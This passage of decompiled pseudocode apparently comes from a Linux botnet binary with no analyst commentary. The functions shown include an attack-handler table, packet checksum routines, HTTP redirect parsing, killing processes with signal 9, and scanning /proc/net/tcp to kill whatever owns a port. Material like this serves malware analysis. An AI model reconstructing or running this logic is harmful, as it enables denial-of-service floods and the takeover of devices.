          *(undefined *)((int)(piVar31 + 0xa6) + (int)piVar20) = 0;
          piVar23 = piVar19;
        } while (piVar20 != (int *)0x0);
        if (*(char *)(piVar31 + -0x16a) != '\a') goto LAB_080487f0;
        iVar8 = piVar31[0xa5];
      }
      puVar18 = (undefined4 *)FUN_080528b0();
      *puVar18 = 0x68;
LAB_08048f3c:
      piVar19 = (int *)FUN_080528b0();
      if ((*piVar19 != 0xb) && (piVar19 = (int *)FUN_080528b0(), *piVar19 != 0xb))
      goto LAB_08048f58;
      goto LAB_080487f0;
    }
    if (cVar4 != '\n') goto LAB_080487f0;
    do {
      puVar18 = (undefined4 *)FUN_080528b0();
      *puVar18 = 0;
      iVar8 = FUN_08054260(piVar31[-0x16b],&cStack_517a + 1,0x2800,0x4000);
      if (iVar8 == 0) {
        puVar18 = (undefined4 *)FUN_080528b0();
        *puVar18 = 0x68;
        break;
      }
    } while (iVar8 != -1);
    piVar19 = (int *)FUN_080528b0();
    if ((*piVar19 != 0xb) && (piVar19 = (int *)FUN_080528b0(), *piVar19 != 0xb)) goto LAB_08048f58;
    if (*(char *)(piVar31 + -0x16a) == '\0') goto LAB_080487f0;
    goto LAB_08048f25;
  }
  goto LAB_080487f0;
LAB_08049659:
  uVar13 = FUN_08051790(0x26,0,iVar8,iVar8);
  iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
  iVar8 = iVar8 + 1;
  if (iVar8 != 0) {
    uVar13 = FUN_08051790(0x26,0,iVar8,iVar8);
    iVar9 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
    iVar9 = iVar9 + (uint)((&cStack_517a)[iVar9 + 1] == ' ');
    pcVar25 = &cStack_517a + iVar9 + 1;
    iVar8 = FUN_08052240(pcVar25,(int)piVar19 - iVar9,&DAT_08056266,2);
    if (iVar8 != -1) {
      if (1 < iVar8) {
        iVar8 = iVar8 + -2;
      }
      (&cStack_517a)[iVar9 + iVar8 + 1] = '\0';
      iVar10 = FUN_08052240(pcVar25,iVar8 + 1,&DAT_0805626b,4);
      if (iVar10 == 4) {
        piStack_58 = (int *)0x7;
        if ((&cStack_517a)[iVar9 + 5] == 's') {
          piStack_58 = (int *)0x8;
        }
        FUN_080548f8(pcVar25,pcVar25 + (int)piStack_58,(iVar8 + 1) - (int)piStack_58,piVar29);
        piStack_58 = (int *)0x0;
        if (*pcVar25 != '\0') {
          pcVar27 = pcVar25;
          if (*pcVar25 != '/') {
            piStack_58 = (int *)0x0;
            do {
              piStack_58 = (int *)((int)piStack_58 + 1);
              pcVar27 = pcVar25 + (int)piStack_58;
              if (*pcVar27 == '\0') goto LAB_08049af4;
            } while (*pcVar27 != '/');
          }
          *pcVar27 = '\0';
        }
LAB_08049af4:
        iVar8 = FUN_08052190(pcVar25);
        if ((0 < iVar8) && (iVar8 = FUN_08052190(pcVar25), iVar8 < 0x80)) {
          FUN_080521b0((int)piVar31 + -0x297,pcVar25,extraout_ECX_09,extraout_ECX_09);
        }
        pcVar25 = &cStack_517a + iVar9 + 2;
        iVar8 = FUN_08052190(pcVar25 + (int)piStack_58);
        if (iVar8 < 0x100) {
          FUN_08052220((int)piVar31 + -0x397,0xff,piVar29,piVar29);
          iVar8 = FUN_08052190(pcVar25 + (int)piStack_58);
          if (0 < iVar8) {
            FUN_080521b0((int)piVar31 + -0x397,pcVar25 + (int)piStack_58,iVar8,iVar8);
          }
        }
      }
      else if (*pcVar25 == '/') {
        pcVar25 = &cStack_517a + iVar9 + 2;
        piVar29 = (int *)((int)piVar31 + -0x397);
        FUN_08052220(piVar29,0xff,iVar10,iVar10);
        iVar8 = FUN_08052190(pcVar25 + (int)piStack_58);
        if ((0 < iVar8) && (iVar8 = FUN_08052190(pcVar25 + (int)piStack_58), iVar8 < 0x100)) {
          FUN_080521b0(piVar29,pcVar25 + (int)piStack_58,iVar8,iVar8);
        }
      }
LAB_08048f25:
      *(undefined *)(piVar31 + -0x16a) = 1;
      goto LAB_080487f0;
    }
  }
  uVar13 = FUN_08051790(0x25,0,iVar8,iVar8);
  iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
  piVar29 = piVar19;
  if (iVar8 != -1) {
    uVar13 = FUN_08051790(0x25,0,pcVar25,pcVar25);
    iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
    iVar8 = iVar8 + (uint)((&cStack_517a)[iVar8 + 1] == ' ');
    pcVar25 = &cStack_517a + iVar8 + 1;
    piVar29 = (int *)FUN_08052240(pcVar25,(int)piVar19 - iVar8,&DAT_08056266,2);
    if (piVar29 != (int *)0xffffffff) {
      if (1 < (int)piVar29) {
        piVar29 = (int *)((int)piVar29 + -2);
      }
      piStack_58 = (int *)0x0;
      (&cStack_517a + 1 + (int)piVar29)[iVar8] = '\0';
      cVar4 = *pcVar25;
      pcVar27 = pcVar25;
      if ((byte)(cVar4 - 0x30U) < 10) {
        piVar24 = (int *)0x1;
        do {
          pcVar27 = pcVar25 + (int)piVar24;
          piStack_58 = piVar24;
          piVar24 = (int *)((int)piVar24 + 1);
          cVar4 = *pcVar27;
        } while ((byte)(cVar4 - 0x30U) < 10);
      }
      piVar24 = piStack_58;
      if (cVar4 != '\0') {
        *pcVar27 = '\0';
        piStack_58 = (int *)((int)piStack_58 + 1);
        if (pcVar25[(int)piStack_58] == ' ') {
          piStack_58 = (int *)((int)piVar24 + 2);
        }
        uVar13 = FUN_08052190(pcVar25 + (int)piStack_58);
        iVar8 = FUN_08052470(pcVar25 + (int)piStack_58,uVar13,&DAT_08056270);
        if (iVar8 != -1) {
          uVar13 = FUN_08052190(pcVar25 + (int)piStack_58);
          iVar8 = FUN_08052470(pcVar25 + (int)piStack_58,uVar13,&DAT_08056270);
          piStack_58 = (int *)((int)piStack_58 + iVar8);
        }
        piVar19 = piStack_58;
        if (pcVar25[(int)piStack_58] == '\"') {
          piStack_58 = (int *)((int)piStack_58 + 1);
          pcVar27 = pcVar25 + (int)piStack_58;
          piVar19 = (int *)FUN_08052190(pcVar27);
          if ((pcVar27 + -1)[(int)piVar19] == '\"') {
            pcVar27 = pcVar25 + (int)piStack_58;
            piVar19 = (int *)FUN_08052190(pcVar27);
            (pcVar27 + -1)[(int)piVar19] = '\0';
          }
        }
        iVar8 = FUN_08052290(pcVar25,10,piVar19,piVar19);
        if (iVar8 - 1U < 9) {
          while (uVar15 = FUN_08054c4c(0), uVar15 < (uint)(iVar8 + (int)piVar17)) {
            FUN_08054d4c(1);
          }
        }
        pcVar27 = pcVar25 + (int)piStack_58;
        uVar13 = FUN_08052190(pcVar27);
        iVar8 = FUN_08052470(pcVar27,uVar13,&DAT_0805626b);
        if (iVar8 == 4) {
          piStack_58 = (int *)0x7;
          if (pcVar27[4] == 's') {
            piStack_58 = (int *)0x8;
          }
          piVar29 = (int *)((int)piVar29 - (int)piStack_58);
          FUN_080548f8(pcVar27,pcVar27 + (int)piStack_58,(int)piVar29 + 1,pcVar25);
          piStack_58 = (int *)0x0;
          if (*pcVar27 != '\0') {
            pcVar25 = pcVar27;
            if (*pcVar27 != '/') {
              piStack_58 = (int *)0x0;
              do {
                piStack_58 = (int *)((int)piStack_58 + 1);
                pcVar25 = pcVar27 + (int)piStack_58;
                if (*pcVar25 == '\0') goto LAB_08049c9e;
              } while (*pcVar25 != '/');
            }
            *pcVar25 = '\0';
          }
LAB_08049c9e:
          iVar8 = FUN_08052190(pcVar27);
          if ((0 < iVar8) && (iVar8 = FUN_08052190(pcVar27), iVar8 < 0x80)) {
            FUN_080521b0((int)piVar31 + -0x297,pcVar27,extraout_ECX_11,extraout_ECX_11);
          }
LAB_08049cd4:
          pcVar27 = pcVar27 + 1;
          iVar8 = FUN_08052190(pcVar27 + (int)piStack_58);
          if (iVar8 < 0x100) {
            FUN_08052220((int)piVar31 + -0x397,0xff,piVar29,piVar29);
            iVar8 = FUN_08052190(pcVar27 + (int)piStack_58);
            piVar19 = piStack_58;
            if (0 < iVar8) {
              FUN_080521b0((int)piVar31 + -0x397,pcVar27 + (int)piStack_58,iVar8,iVar8);
              piVar29 = piVar19;
            }
          }
        }
        else if (*pcVar27 == '/') goto LAB_08049cd4;
        *(undefined *)(piVar31 + -0x16a) = 10;
        *(undefined4 *)((int)piVar31 + -0x15) = 0x544547;
        goto LAB_080487f0;
      }
    }
  }
  iVar8 = FUN_08052240(&cStack_517a + 1,piVar19,&DAT_08056264,4);
  uVar13 = FUN_080524f0((int)piVar31 + -0x15,&DAT_08056275);
  if (((char)uVar13 == '\0') &&
     (cVar4 = FUN_080524f0((int)piVar31 + -0x15,&DAT_08056254,uVar13,uVar13), cVar4 == '\0')) {
    *(char *)(piVar31 + -0x16a) = (iVar8 < (int)piVar19) * '\t' + '\x01';
  }
  else {
    *(undefined *)(piVar31 + -0x16a) = 7;
  }
  FUN_08054260(piVar31[-0x16b],&cStack_517a + 1,iVar8,0x4000);
LAB_080487f0:
  piVar31 = piVar31 + 0x311;
  iStack_5190 = iStack_5190 + 1;
  if (iStack_5190 == iStack_5188) goto LAB_08048564;
  goto LAB_0804880d;
}



undefined8 FUN_08049ef0(byte param_1,undefined4 *param_2,char param_3,undefined4 param_4)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  uint uVar3;
  undefined4 uStack_c;
  
  uStack_c = CONCAT13(param_3,(undefined3)uStack_c);
  if (param_1 != 0) {
    if (*(char *)(param_2 + 1) != param_3) {
      uVar3 = 0;
      puVar2 = param_2;
      do {
        param_2 = puVar2 + 2;
        uVar3 = uVar3 + 1;
        if (param_1 == uVar3) goto LAB_08049f36;
        puVar1 = puVar2 + 3;
        puVar2 = param_2;
      } while (*(char *)puVar1 != param_3);
    }
    return CONCAT44(uStack_c,*param_2);
  }
LAB_08049f36:
  return CONCAT44(uStack_c,param_4);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_08049f50(uint param_1,byte param_2,byte param_3,undefined4 param_4,byte param_5,
                 uint param_6)

{
  char cVar1;
  code *pcVar2;
  int iVar3;
  undefined4 uVar4;
  uint uVar5;
  code **extraout_EDX;
  code **ppcVar6;
  uint uVar7;
  uint *puVar8;
  undefined *puVar9;
  uint uVar10;
  uint uVar11;
  uint auStack_30 [5];
  undefined auStack_1c [8];
  uint uStack_14;
  
  puVar8 = (uint *)auStack_1c;
  uVar7 = (uint)param_2;
  uVar11 = (uint)param_3;
  uVar10 = (uint)param_5;
  auStack_30[4] = 0x8049f69;
  iVar3 = FUN_080544c5();
  if ((iVar3 == -1) || (0 < iVar3)) {
    return;
  }
  auStack_30[4] = 0x8049f85;
  iVar3 = FUN_080544c5();
  puVar9 = auStack_1c;
  if (iVar3 == -1) goto LAB_08049fd2;
  if (iVar3 != 0) goto LAB_08049fdc;
  puVar8 = auStack_30 + 1;
  auStack_30[1] = param_1;
  FUN_08054d4c();
  uVar4 = FUN_08054cdc();
  uVar11 = auStack_30[2];
  uVar10 = auStack_30[1];
  auStack_30[2] = 9;
  auStack_30[1] = uVar4;
  FUN_080545e0();
  auStack_30[1] = 0;
  FUN_080528bd();
  ppcVar6 = extraout_EDX;
LAB_08049fb5:
  *(uint *)((int)puVar8 + -4) = param_6;
  *(uint *)((int)puVar8 + -8) = uVar10 & 0xff;
  *(undefined4 *)((int)puVar8 + -0xc) = param_4;
  *(uint *)((int)puVar8 + -0x10) = uVar11 & 0xff;
  pcVar2 = *ppcVar6;
  *(undefined4 *)((int)puVar8 + -0x14) = 0x8049fcf;
  (*pcVar2)();
  uVar7 = param_6;
  puVar9 = (undefined *)puVar8;
LAB_08049fd2:
  do {
    do {
      puVar8 = (uint *)(puVar9 + -0x10);
      *(undefined4 *)(puVar9 + -0x10) = 0;
      *(undefined4 *)(puVar9 + -0x14) = 0x8049fdc;
      FUN_080528bd();
LAB_08049fdc:
      uStack_14 = (uint)DAT_080570bc;
      puVar9 = (undefined *)puVar8;
    } while (DAT_080570bc == 0);
    uVar5 = 0;
    ppcVar6 = (code **)*_DAT_080570c0;
    cVar1 = *(char *)(ppcVar6 + 1);
    while( true ) {
      if (cVar1 == (char)uVar7) goto LAB_08049fb5;
      uVar5 = uVar5 + 1;
      if (uVar5 == uStack_14) break;
      ppcVar6 = (code **)_DAT_080570c0[uVar5];
      cVar1 = *(char *)(ppcVar6 + 1);
    }
  } while( true );
}



void FUN_0804a010(undefined4 *param_1,uint param_2)

{
  byte *pbVar1;
  undefined uVar2;
  undefined4 uVar3;
  uint uVar4;
  undefined2 *puVar5;
  undefined4 uVar6;
  undefined2 *puVar7;
  undefined4 extraout_ECX;
  undefined4 *puVar8;
  int iVar9;
  undefined4 *puVar10;
  uint uVar11;
  uint uVar12;
  undefined4 *puVar13;
  undefined4 *puVar14;
  undefined4 *puStack_2c;
  byte bStack_21;
  undefined4 *puStack_20;
  undefined4 *puStack_1c;
  int iStack_18;
  
  if (param_2 < 4) {
    return;
  }
  uVar3 = FUN_08054228(*param_1);
  if (param_2 == 4) {
    return;
  }
  uVar2 = *(undefined *)(param_1 + 1);
  if (param_2 == 5) {
    return;
  }
  if (*(byte *)((int)param_1 + 5) == 0) {
    return;
  }
  uVar4 = (uint)*(byte *)((int)param_1 + 5);
  if (param_2 - 6 < uVar4 * 5) {
    return;
  }
  puVar5 = (undefined2 *)FUN_08052be0(uVar4,0x18,uVar4,uVar4);
  puVar13 = (undefined4 *)(uVar4 * 5 + (int)(undefined4 *)((int)param_1 + 6));
  puVar7 = puVar5;
  puVar8 = (undefined4 *)((int)param_1 + 6);
  uVar12 = param_2 - 6;
  do {
    uVar11 = uVar12;
    puVar10 = puVar8;
    uVar6 = *puVar10;
    uVar12 = uVar11 - 5;
    *(undefined4 *)(puVar7 + 8) = uVar6;
    puVar8 = (undefined4 *)((int)puVar10 + 5);
    *(byte *)(puVar7 + 10) = *(byte *)(puVar10 + 1);
    *puVar7 = 2;
    *(undefined4 *)(puVar7 + 2) = uVar6;
    puVar7 = puVar7 + 0xc;
  } while (puVar8 != puVar13);
  puVar14 = (undefined4 *)0x0;
  if (uVar12 == 0) goto LAB_0804a0fb;
  puVar13 = (undefined4 *)(uint)*(byte *)puVar8;
  if (*(byte *)puVar8 == 0) {
    puStack_20 = (undefined4 *)0x0;
  }
  else {
    puVar14 = (undefined4 *)FUN_08052be0(puVar13,8,puVar13,puVar13);
    if ((uVar11 == 6) || (*(byte *)(puVar14 + 1) = *(byte *)((int)puVar10 + 6), uVar12 == 2))
    goto LAB_0804a0fb;
    bStack_21 = *(byte *)((int)puVar10 + 7);
    iStack_18 = uVar11 - 8;
    uVar12 = (uint)bStack_21;
    if (iStack_18 < (int)uVar12) goto LAB_0804a0fb;
    puVar10 = puVar10 + 2;
    puStack_2c = (undefined4 *)0x0;
    puStack_1c = puVar14;
    while( true ) {
      uVar6 = FUN_08052be0(uVar12 + 1,1,uVar12,uVar12);
      *puStack_1c = uVar6;
      FUN_080521f0(uVar6,puVar10,uVar12);
      puStack_2c = (undefined4 *)((int)puStack_2c + 1);
      puStack_20 = puVar13;
      if (puStack_2c == puVar13) break;
      iStack_18 = iStack_18 - uVar12;
      if (iStack_18 == 0) goto LAB_0804a0fb;
      pbVar1 = (byte *)((uint)bStack_21 + (int)puVar10);
      puStack_1c = puVar14 + (int)puStack_2c * 2;
      *(byte *)(puVar14 + (int)puStack_2c * 2 + 1) = *pbVar1;
      if (iStack_18 == 1) goto LAB_0804a0fb;
      bStack_21 = pbVar1[1];
      iStack_18 = iStack_18 + -2;
      uVar12 = (uint)bStack_21;
      if (iStack_18 < (int)uVar12) goto LAB_0804a0fb;
      puVar10 = (undefined4 *)(pbVar1 + 2);
    }
  }
  puVar8 = (undefined4 *)FUN_080528b0();
  *puVar8 = 0;
  FUN_08049f50(uVar3,uVar2,uVar4,puVar5,puStack_20,puVar14,extraout_ECX,extraout_ECX);
LAB_0804a0fb:
  if (puVar5 != (undefined2 *)0x0) {
    FUN_080530c0(puVar5);
  }
  if (puVar14 == (undefined4 *)0x0) {
    return;
  }
  if ((char)puVar13 != '\0') {
    iVar9 = 1;
    do {
      if (puVar14[iVar9 * 2 + -2] != 0) {
        FUN_080530c0(puVar14[iVar9 * 2 + -2]);
      }
      iVar9 = iVar9 + 1;
    } while (iVar9 != ((uint)puVar13 & 0xff) + 1);
  }
  FUN_080530c0();
  return;
}



void __regparm3 FUN_0804a260(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  
  if (DAT_080570e0 != 0) {
    FUN_080545e0(DAT_080570e0,9,param_2,param_2);
    param_3 = extraout_ECX;
    param_2 = extraout_EDX;
  }
  DAT_080570e0 = 0;
  if (DAT_080570e4 != 0) {
    FUN_080545e0(DAT_080570e4,9,param_3,param_3);
    param_3 = extraout_ECX_05;
    param_2 = extraout_EDX_04;
  }
  DAT_080570e4 = 0;
  if (DAT_080570e8 != 0) {
    FUN_080545e0(DAT_080570e8,9,param_2,param_2);
    param_3 = extraout_ECX_04;
    param_2 = extraout_EDX_03;
  }
  DAT_080570e8 = 0;
  if (DAT_080570ec != 0) {
    FUN_080545e0(DAT_080570ec,9,param_3,param_3);
    param_3 = extraout_ECX_03;
    param_2 = extraout_EDX_02;
  }
  DAT_080570ec = 0;
  if (DAT_080570f0 != 0) {
    FUN_080545e0(DAT_080570f0,9,param_2,param_2);
    param_3 = extraout_ECX_02;
    param_2 = extraout_EDX_01;
  }
  DAT_080570f0 = 0;
  if (DAT_080570f4 != 0) {
    FUN_080545e0(DAT_080570f4,9,param_3,param_3);
    param_3 = extraout_ECX_01;
    param_2 = extraout_EDX_00;
  }
  DAT_080570f4 = 0;
  if (DAT_080570f8 != 0) {
    FUN_080545e0(DAT_080570f8,9,param_2,param_2);
    param_3 = extraout_ECX_00;
  }
  DAT_080570f8 = 0;
  if (DAT_080570fc != 0) {
    FUN_080545e0(DAT_080570fc,9,param_3,param_3);
  }
  DAT_080570fc = 0;
  FUN_0804fe90();
  return;
}



undefined4 FUN_0804a410(byte param_1,int *param_2,char param_3,undefined4 param_4)

{
  int *piVar1;
  int *piVar2;
  undefined4 uVar3;
  uint uVar4;
  
  if (param_1 != 0) {
    if (param_3 != *(char *)(param_2 + 1)) {
      uVar4 = 0;
      piVar2 = param_2;
      do {
        param_2 = piVar2 + 2;
        uVar4 = uVar4 + 1;
        if (param_1 == uVar4) {
          return param_4;
        }
        piVar1 = piVar2 + 3;
        piVar2 = param_2;
      } while (param_3 != *(char *)piVar1);
    }
    if (*param_2 != 0) {
      uVar3 = FUN_08052290();
      return uVar3;
    }
  }
  return param_4;
}



undefined4 FUN_0804a480(void)

{
  undefined4 *puVar1;
  uint uVar2;
  
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 0;
  *puVar1 = &DAT_0804c880;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 1;
  *puVar1 = &DAT_0804ccd0;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 2;
  *puVar1 = &DAT_0804d0a0;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 9;
  *puVar1 = &DAT_0804c5c0;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 3;
  *puVar1 = &DAT_0804bff0;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 4;
  *puVar1 = &DAT_0804b9e0;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 5;
  *puVar1 = &DAT_0804b320;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 6;
  *puVar1 = &DAT_0804ada0;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 7;
  *puVar1 = &DAT_0804a790;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  uVar2 = (uint)DAT_080570bc;
  DAT_080570bc = DAT_080570bc + 1;
  *(undefined4 **)(DAT_080570c0 + uVar2 * 4) = puVar1;
  puVar1 = (undefined4 *)FUN_08052be0(1,8);
  *(undefined *)(puVar1 + 1) = 10;
  *puVar1 = 0x80481a0;
  DAT_080570c0 = FUN_08053ae0(DAT_080570c0,(uint)DAT_080570bc * 4 + 4);
  *(undefined4 **)(DAT_080570c0 + (uint)DAT_080570bc * 4) = puVar1;
  DAT_080570bc = DAT_080570bc + 1;
  return 1;
}



uint FUN_0804d790(ushort *param_1,uint param_2)

{
  ushort uVar1;
  uint uVar2;
  
  uVar2 = 0;
  if (1 < param_2) {
    do {
      uVar1 = *param_1;
      param_2 = param_2 - 2;
      param_1 = param_1 + 1;
      uVar2 = uVar2 + uVar1;
    } while (1 < param_2);
  }
  if (param_2 == 1) {
    uVar2 = uVar2 + (int)*(char *)param_1;
  }
  uVar2 = (uVar2 & 0xffff) + (uVar2 >> 0x10);
  return ((uVar2 >> 0x10) + uVar2 ^ 0xffffffff) & 0xffff;
}



uint FUN_0804d7e0(int param_1,ushort *param_2,uint param_3,int param_4)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  
  iVar5 = 0;
  uVar4 = *(uint *)(param_1 + 0xc);
  uVar2 = *(uint *)(param_1 + 0x10);
  if (1 < param_4) {
    do {
      uVar1 = *param_2;
      param_4 = param_4 + -2;
      param_2 = param_2 + 1;
      iVar5 = iVar5 + (uint)uVar1;
    } while (1 < param_4);
  }
  if (param_4 == 1) {
    iVar5 = iVar5 + (uint)*(byte *)param_2;
  }
  uVar3 = FUN_080540b4(*(undefined *)(param_1 + 9));
  for (uVar4 = (uVar2 & 0xffff) + (uVar4 & 0xffff) + (uVar4 >> 0x10) + (uVar2 >> 0x10) +
               (param_3 & 0xffff) + iVar5 + (uVar3 & 0xffff); uVar4 >> 0x10 != 0;
      uVar4 = (uVar4 & 0xffff) + (uVar4 >> 0x10)) {
  }
  return (uVar4 ^ 0xffffffff) & 0xffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0804d8a0(void)

{
  FUN_080545e0(_DAT_080576d8,9);
  return;
}



bool FUN_0804d8c0(undefined2 param_1)

{
  byte *pbVar1;
  byte bVar2;
  bool bVar3;
  undefined2 uVar4;
  int iVar5;
  uint uVar6;
  byte *pbVar7;
  undefined4 uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  bool bVar12;
  int iVar13;
  int iVar14;
  undefined *puVar15;
  undefined auStack_2231 [4096];
  undefined auStack_1231 [4096];
  byte abStack_231 [513];
  undefined uStack_30;
  undefined uStack_2f;
  undefined uStack_2c;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  
  FUN_0805492c(auStack_1231,0,0x1000);
  FUN_0805492c(auStack_2231,0,0x1000);
  FUN_0805492c(abStack_231,0,0x201);
  uStack_20 = 0;
  uStack_1c = 0;
  uStack_18 = 0;
  uStack_14 = 0;
  uVar4 = FUN_08054254(param_1);
  FUN_08052590(uVar4,0x10,&uStack_30);
  iVar5 = FUN_08052190(&uStack_30);
  if (iVar5 == 2) {
    uStack_2c = 0;
    uStack_30 = 0x30;
    uStack_2f = 0x30;
  }
  FUN_08051840(6);
  FUN_08051840(7);
  FUN_08051840(9);
  uVar6 = FUN_08052a68("/proc/net/tcp",0);
  uVar9 = uVar6;
  if (uVar6 != 0xffffffff) {
LAB_0804d9c0:
    do {
      do {
        do {
          do {
            iVar5 = FUN_08052390(abStack_231,0x200,uVar6,uVar9);
            if (iVar5 == 0) goto LAB_0804daf7;
            uVar9 = (uint)abStack_231[0];
            if ((abStack_231[0] == 0) || (abStack_231[0] == 0x3a)) {
              iVar5 = 0;
            }
            else {
              iVar5 = 0;
              do {
                iVar5 = iVar5 + 1;
                bVar2 = abStack_231[iVar5];
                uVar9 = (uint)bVar2;
                if (bVar2 == 0) goto LAB_0804d9c0;
              } while (bVar2 != 0x3a);
            }
          } while ((char)uVar9 == '\0');
          iVar14 = iVar5 + 2;
          iVar13 = iVar14;
          if ((abStack_231[iVar5 + 2] != 0) && (abStack_231[iVar5 + 2] != 0x20)) {
            pbVar7 = abStack_231 + iVar5;
            do {
              pbVar1 = pbVar7 + 3;
              iVar13 = iVar13 + 1;
              pbVar7 = pbVar7 + 1;
              if (*pbVar1 == 0) break;
            } while (*pbVar1 != 0x20);
          }
          abStack_231[iVar13] = 0;
          pbVar7 = abStack_231 + iVar14;
          uVar8 = FUN_08052190(pbVar7);
          iVar5 = FUN_08052470(pbVar7,uVar8,&uStack_30);
          uVar9 = iVar5 + 1U;
        } while (iVar5 + 1U == 0);
        pbVar7 = abStack_231 + iVar13;
        bVar3 = false;
        iVar14 = 0;
        bVar12 = false;
        iVar5 = iVar13 + 1;
LAB_0804da70:
        do {
          iVar13 = iVar5;
          bVar2 = pbVar7[2];
          iVar5 = iVar13 + 1;
          if (bVar2 == 0) break;
          if ((bVar2 == 0x20) || (bVar2 == 9)) {
            bVar3 = true;
          }
          else {
            if ((bVar3) && (iVar14 = iVar14 + 1, iVar14 == 1)) {
              if (pbVar7[3] == 0x41) {
                bVar12 = true;
              }
              pbVar7 = pbVar7 + 1;
              bVar3 = false;
              goto LAB_0804da70;
            }
            bVar3 = false;
          }
          pbVar7 = pbVar7 + 1;
        } while (iVar14 < 7);
        uVar9 = (uint)bVar2;
      } while (!bVar12);
      iVar14 = iVar5;
      if ((abStack_231[iVar13 + 1] != 0) && (abStack_231[iVar13 + 1] != 0x20)) {
        pbVar7 = abStack_231 + iVar5;
        do {
          pbVar1 = pbVar7 + 1;
          iVar14 = iVar14 + 1;
          pbVar7 = pbVar7 + 1;
          if (*pbVar1 == 0) break;
        } while (*pbVar1 != 0x20);
      }
      abStack_231[iVar14] = 0;
      pbVar7 = abStack_231 + iVar5;
      uVar9 = FUN_08052190(pbVar7);
    } while (0xf < (int)uVar9);
    FUN_080521b0(&uStack_20,pbVar7,uVar9,uVar9);
LAB_0804daf7:
    FUN_08054c95(uVar6);
    iVar5 = FUN_08052190(&uStack_20);
    if (iVar5 != 0) {
      uVar8 = FUN_08051790(6,0,iVar5,iVar5);
      iVar5 = FUN_08052678(uVar8);
      bVar3 = false;
      bVar12 = false;
      if (iVar5 != 0) {
        while ((iVar14 = FUN_080526c0(iVar5), iVar14 != 0 && (!bVar3))) {
          iVar13 = CONCAT31((int3)((uint)iVar14 >> 8),*(undefined *)(iVar14 + 0x13)) + -0x30;
          if ((byte)iVar13 < 10) {
            iVar14 = iVar14 + 0x13;
            uVar8 = FUN_08051790(6,0,iVar13,iVar13);
            FUN_080521b0(auStack_1231,uVar8);
            iVar13 = FUN_08052190(auStack_1231);
            FUN_080521b0(auStack_1231 + iVar13,iVar14);
            uVar8 = FUN_08051790(7,0);
            iVar13 = FUN_08052190(auStack_1231);
            FUN_080521b0(auStack_1231 + iVar13,uVar8);
            iVar13 = FUN_08054d10(auStack_1231,auStack_2231,0x1000);
            iVar13 = iVar13 + 1;
            if (iVar13 != 0) {
              uVar8 = FUN_08051790(6,0,iVar13,iVar13);
              FUN_080521b0(auStack_1231,uVar8);
